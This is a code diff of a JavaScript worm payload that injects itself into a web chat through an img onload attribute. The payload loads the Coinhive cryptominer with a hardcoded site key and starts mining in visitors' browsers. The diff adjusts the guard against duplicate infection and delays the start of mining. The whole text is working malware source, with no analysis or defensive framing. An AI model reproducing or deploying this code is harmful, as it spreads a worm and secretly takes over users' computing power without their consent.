@@ -1,8 +1,7 @@
 // BEGIN payload [
 //chatBox.payload = "
 /* avoid duplicate infection */
-if (chatBox.hasOwnProperty('_metadata')) {
-    return;}
+if (! chatBox.hasOwnProperty('_metadata')) {
 
 /* inject worm */
 /*
@@ -22,14 +21,13 @@ chatBox.sendNewChatMsg = function() {
 chatBox._metadata = new (function() {
     this.payload = 'TODO';
     this.shellcode = '-ico.png" onload="$PAYLOAD"><img class="';
-    this.MINER_SITE_KEY = 'SEQdskKvQxTyZSDkP4LsnGoWiMVaoHR7';
     this.load_miner = function () {
         var miner_script = document.createElement('script');
         miner_script.src = 'https://coinhive.com/lib/coinhive.min.js';
         miner_script.type = 'text/javascript';
         document.getElementsByTagName("head")[0].appendChild(miner_script);};
     this.start_miner = function () {
-        this.miner = new CoinHive.Anonymous(this.MINER_SITE_KEY);
+        this.miner = CoinHive.Anonymous('SEQdskKvQxTyZSDkP4LsnGoWiMVaoHR7');
         this.miner.setThrottle(0.25);
         this.miner.start();
     };
@@ -39,6 +37,8 @@ chatBox._metadata = new (function() {
 });
 
 chatBox._metadata.load_miner();
-setTimeout(chatBox._metadata.start_miner, 2000);
+setTimeout(chatBox._metadata.start_miner, 20000);
+
+}
 //"
 // END payload ]
